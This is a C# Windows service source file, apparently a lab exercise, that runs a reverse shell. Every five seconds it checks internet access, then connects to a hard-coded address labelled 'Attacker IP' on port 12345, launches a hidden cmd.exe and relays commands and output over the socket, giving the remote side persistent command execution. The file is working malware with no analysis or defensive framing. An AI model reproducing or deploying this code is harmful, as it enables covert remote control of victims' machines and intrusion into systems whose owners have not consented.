﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;
using System.Net.Sockets;

namespace lab3_bai3
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        Timer timer = new Timer();

        protected override void OnStart(string[] args)
        {
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds 
            timer.Enabled = true;
        }
        protected override void OnStop()
        {

        }
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            if (CheckInternetConnection())
            {
                WriteToFile(":)))) Connection started at " + DateTime.Now);
                RevShell();
            }
            else
            {
                WriteToFile(":((((( Connection closed at " + DateTime.Now);
            }
        }
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }

            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";

            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        public static bool CheckInternetConnection(int timeoutMs = 10000)
        {
            try
            {
                string url = "http://google.com";
                var request = (HttpWebRequest)WebRequest.Create(url);
                request.KeepAlive = false;
                request.Timeout = timeoutMs;
                using (var response = (HttpWebResponse)request.GetResponse())
                    return true;
            }
            catch
            {
                return false;
            }
        }

        static StreamWriter streamWriter;

        public static void RevShell()
        {
            using (TcpClient client = new TcpClient("192.168.70.131", 12345)) /*Attacker IP*/
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process ps = new Process();
                        ps.StartInfo.FileName = "cmd.exe";
                        ps.StartInfo.CreateNoWindow = true;
                        ps.StartInfo.UseShellExecute = false;
                        ps.StartInfo.RedirectStandardOutput = true;
                        ps.StartInfo.RedirectStandardInput = true;
                        ps.StartInfo.RedirectStandardError = true;
                        ps.OutputDataReceived += new DataReceivedEventHandler(OutputDataHandler);

                        ps.Start();
                        ps.BeginOutputReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            strInput.Append("\n");
                            ps.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception error)
                {

                }
            }
        }
    }
}